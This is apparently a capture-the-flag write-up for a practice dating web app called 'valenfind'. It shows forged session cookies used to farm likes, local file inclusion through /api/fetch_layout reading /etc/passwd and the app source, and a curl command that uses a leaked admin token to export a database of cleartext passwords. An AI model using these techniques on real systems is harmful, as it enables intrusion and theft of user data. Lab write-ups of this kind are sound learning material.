# valenfind

ports open: 5000, 22

---

exploring the web app:

- login/signup/logout
  - GET /complete_profile
- manage profile (POST /my_profile)
  - name
  - email (match pattern)
  - phone
  - address
  - bio
  - all chars allowed
- view others' profiles (/profile/username)
  - pfp
  - bio
  - username
  - change profile theme (GET /api/fetch_layout?layout=theme_classic.html) <---
- send likes (POST /like/ID)
  - one per person

---

- no xss in bio or name (yet)
- we can also make our profile unvisitable from the main page by using bad characters

---

looking around at the session mechanism:

one cookie: session

JWT-like, 3 values separated by '.'

`eyJsaWtlZCI6WzExXSwidXNlcl9pZCI6OSwidXNlcm5hbWUiOiJtZSJ9.abeh-A.M9_QyYk6GmIf1C-IRqFMOdzmtVY`

first is base64:

`{"liked":[11],"user_id":9,"username":"me"}`

other 2 values seem to be hmac or digest

---

this part stores our state, the server uses the "liked" key to deny likes if we have already liked that profile

interesting: when we successfully like, we get a different format of session cookie in the response with a redirect to /dashboard which gives us our normal state cookie back...

---

using this, we can simply forge requests with an cookie that doesn't include the profile we are trying to like, and give it as many likes as we want:

![likefarmer](/images/20260316_00h25m03s_grim.png)

that's also _more_ likes than i sent

- when doing this, the value at the end of our cookie changed periodically, indicating it is a time-based value
- same with the previous value, but it only changes slightly
- first value does not change (probably just includes new intended state)

- second two values are similar to the normal state cookie, probably same mechanism

reversing this will probably let us get a session as any user

the first value is base64-encoded zlib data (indicated by .eJ)

```
>>> import base64
>>> import zlib
>>> data = ".eJwli80KQEAURl_l-tazMBKRvIeQptxB_sqdWcm7G1mdzqlzY7CbkZkFZXuDXAB2FjETQ6E5PQkfjgxty8oRdT7Js7TzlmOL_ukVvj6Gq1A6DuqFr2EJQetfDrMzSlQ1nheF\
YyIz"
>>> decode = base64.urlsafe_b64decode(data.strip('.'))
>>> decode
b'x\x9c%\x8b\xcd\n@@\x14F_\xe5\xfa\xd6\xb30\x12\x91\xbc\x87\x90\xa6\xdcA\xfe\xca\x9dY\xc9\xbb\x1bY\x9d\xce\xa9sc\xb0\x9b\x91\x99\x05e{\x83\\\x00v\x161\x13C\xa19=\t\x1f\x8e\x0cm\xcb\xca\x11u>\xc9\xb3\xb4\xf3\x96c\x8b\xfe\xe9\x15\xbe>\x86\xabP:\x0e\xea\x85\xafa\tA\xeb_\x0e\xb33JT5\x9e\x17\x85c"3'
>>> zlib.decompress(decode)
b'{"_flashes":[{" t":["message","You sent a like! \\u2764\\ufe0f"]}],"liked":[9,10],"user_id":11,"username":"<>"}'
```

the session cookie we get after sending this back just has a normal base64 json payload (not compressed)

---

we probably want to try leaking other profiles' data somehow, it is hinted "your secrets are safe with us, mostly..."

---

lets look at the /api/fetch_layout endpoint we found earlier, it looks like we could have LFI

here is the javascript that loads it:

```javascript
// Initial load
    document.addEventListener("DOMContentLoaded", function() {
        loadTheme('theme_classic.html');
    });

    function loadTheme(layoutName) {
        // Feature: Dynamic Layout Fetching
        fetch(`/api/fetch_layout?layout=${layoutName}`)
            .then(r => r.text())
            .then(html => {
                const bioText = "Looking for my Juliet. Where art thou?";
                const username = "romeo_montague";
                
                // Client-side rendering of the fetched template
                let rendered = html.replace('__USERNAME__', username)
                                   .replace('__BIO__', bioText);
                
                document.getElementById('bio-container').innerHTML = rendered;
            })
            .catch(e => {
                console.error(e);
                document.getElementById('bio-container').innerText = "Error loading theme.";
            });
    }
```

looks like the bioText and username get assigned here, maybe js injection??

then it loads our template, replacing the __ placeholders with our vars and setting the html

but we should focus on the actual api which returns the entire template:

testing for lfi on the layout var:

`GET /api/fetch_layout?layout=/etc/passwd`

works!

we can read things like the server templates:

../index.html

```html
{% extends "base.html" %}

{% block content %}
<div class="card" style="text-align: center;">
    <h1>Find Your Valentine ❤️</h1>
    <p>Join the most exclusive offline dating community.</p>
    <br>
    <a href="{{ url_for('register') }}" class="btn">Start Your Journey</a>
</div>
{% endblock %}
```

app install dir:

`/proc/self/cmdline`: /usr/bin/python3/opt/Valenfind/app.py

- reading auth.log we can see a cronjob running as root
- /home/ubuntu/.ssh/authorized keys has some keys with interesting comments
- need key for ssh
- no RFI
- no ssh keys lying around

reading the app source code:

```python
ADMIN_API_KEY = "THE_KEY"
DATABASE = 'cupid.db'
```

we also find an interesting new route:

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403
```

we need this to get the db as trying to get it via lfi results in "database file access strictly prohibited"

so, lets export the db:

`curl -o db -H 'X-Valentine-Token: THE_KEY' http://10.67.172.249:5000/api/admin/export_db`

inspecting the db we find the table 'users' with cleartext passwords:

`SELECT username,password FROM users;`

and we also find the flag in the "home address" field of one of the users. the one with the bio "i keep the database secure, no peeking"

---

overall real good box for me, i considered a lot of things like clobbering the objects or reversing the session cookie, or even xss, but the real flaws were more simple

lfi -> find sensitive credentials -> leverage to extract data -> weak password storage mechanism -> disclose

and we got a lot of likes on the way :)
